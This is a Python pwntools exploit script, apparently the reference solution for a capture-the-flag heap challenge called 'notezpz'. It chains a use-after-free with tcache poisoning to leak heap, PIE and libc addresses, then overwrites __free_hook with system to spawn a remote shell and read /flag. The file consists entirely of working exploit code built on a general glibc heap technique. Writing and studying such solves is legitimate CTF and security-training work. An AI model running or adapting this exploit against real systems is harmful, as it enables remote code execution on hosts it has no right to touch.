#!/usr/bin/env python3
from pwn import *
import os

context.binary = exe = ELF('./notezpz_patched')
context.arch = 'i386'
libc = ELF('./libc.so.6')
# context.log_level = 'debug'

HOST = os.getenv('HOST', '127.0.0.1')
PORT = int(os.getenv('PORT', '8004'))
MAX_TRIES = int(os.getenv('MAX_TRIES', '64'))

class RetryExploit(Exception):
    pass

def has_lf(*xs):
    """fgets() stops at 0x0a; retry ASLR layouts containing LF in injected pointers."""
    for x in xs:
        if isinstance(x, int):
            b = p32(x)
        else:
            b = x
        if b'\n' in b:
            return True
    return False

def start():
    if args.L:
        return process(exe.path)
    return remote(HOST, PORT)

def run_once(attempt=1):
    p = start()

    def recv_menu():
        return p.recvuntil(b'Enter your choice, (or press enter to refresh): ')

    def create():
        p.sendline(b'C')
        recv_menu()

    def delete(idx, wait=True):
        p.sendline(b'D')
        p.sendline(str(idx).encode())
        if wait:
            recv_menu()

    def setq(idx, data, wait=True):
        if b'\n' in data[:-1]:
            raise RetryExploit('payload contains newline before fgets terminator')
        p.sendline(b'S')
        p.sendline(str(idx).encode())
        p.sendline(data)
        if wait:
            recv_menu()

    def ask(idx, wait=True):
        p.sendline(b'A')
        p.sendline(str(idx).encode())
        if wait:
            recv_menu()

    try:
        recv_menu()

        # q0/q1 layout in 0x20-byte i386 tcache chunks.
        create()
        create()
        delete(1)
        delete(0)

        # q2 reuses q0's struct and q0's buffer. q2->text points at the old q0 buffer,
        # whose tcache fd leaks the old q1 struct address.
        create()
        ask(2, wait=False)
        p.recvuntil(b"I have the answer perhaps: '")
        freed_q1_struct = u32(p.recv(4))
        freed_q0_struct = freed_q1_struct - 0x40
        log.success(f'freed q1 struct = {hex(freed_q1_struct)}')
        log.success(f'freed q0 struct = {hex(freed_q0_struct)}')
        if has_lf(freed_q1_struct, freed_q0_struct):
            raise RetryExploit('heap pointer contains newline')
        recv_menu()

        # Poison q1 struct's fd so q3->text will point to q0 struct.
        payload = flat({
            0: p32(freed_q1_struct),
            28: p32(0x21),
            32: p32(freed_q0_struct),
        }, filler=b'A')
        setq(2, payload)

        create()  # q3

        # q3->text points to q0 struct; asking q3 leaks print_question from q0->print.
        ask(3, wait=False)
        p.recvuntil(b"I have the answer perhaps: '")
        print_question = u32(p.recv(4))
        exe.address = print_question - exe.sym['print_question']
        log.success(f'pie base = {hex(exe.address)}')
        if (exe.address & 0xfff) != 0:
            raise RetryExploit('PIE leak is not page-aligned')
        if has_lf(print_question, exe.got['puts']):
            raise RetryExploit('PIE pointer contains newline')
        recv_menu()

        # Point q3->text at puts@got to leak libc.
        payload = flat({
            0: p32(freed_q1_struct),
            28: p32(0x21),
            32: p32(print_question),
            56: p32(exe.got['puts']),
            60: p32(0x21),
        }, filler=b'B')
        setq(2, payload)

        ask(3, wait=False)
        p.recvuntil(b"I have the answer perhaps: '")
        puts_leak = u32(p.recv(4))
        libc.address = puts_leak - libc.sym['puts']
        log.success(f'libc base = {hex(libc.address)}')
        if (libc.address & 0xfff) != 0:
            raise RetryExploit('libc leak is not page-aligned')
        if has_lf(libc.sym['__free_hook'], libc.sym['system']):
            raise RetryExploit('libc target pointer contains newline')
        recv_menu()

        # Point q3->text at __free_hook, overwrite it with system.
        payload = flat({
            0: p32(freed_q1_struct),
            28: p32(0x21),
            32: p32(print_question),
            56: p32(libc.sym['__free_hook']),
            60: p32(0x21),
        }, filler=b'C')
        setq(2, payload)
        setq(3, p32(libc.sym['system']))

        # q2->text is still controllable; first free(q2->text) becomes system(q2->text).
        setq(2, b'/bin//sh\x00')
        delete(2, wait=False)

        # The vulnerable program printed the id prompt before reading the id that triggers
        # system('/bin//sh').  Consume that pending prompt first; otherwise the command
        # can race with the menu I/O under xinetd/chroot and make docker tests flaky.
        try:
            p.recvuntil(b'Enter question id: ', timeout=2)
        except EOFError:
            pass

        # Prove shell for automated deployment tests; keep it simple for the chroot.
        p.sendline(b'cat /flag; exit')
        return p
    except RetryExploit as e:
        log.warning(f'attempt {attempt}: retrying: {e}')
        p.close()
        raise
    except Exception:
        p.close()
        raise

last = None
for i in range(1, MAX_TRIES + 1):
    try:
        p = run_once(i)
        p.interactive()
        break
    except RetryExploit as e:
        last = e
        continue
else:
    log.failure(f'failed after {MAX_TRIES} attempts: {last}')
    raise SystemExit(1)
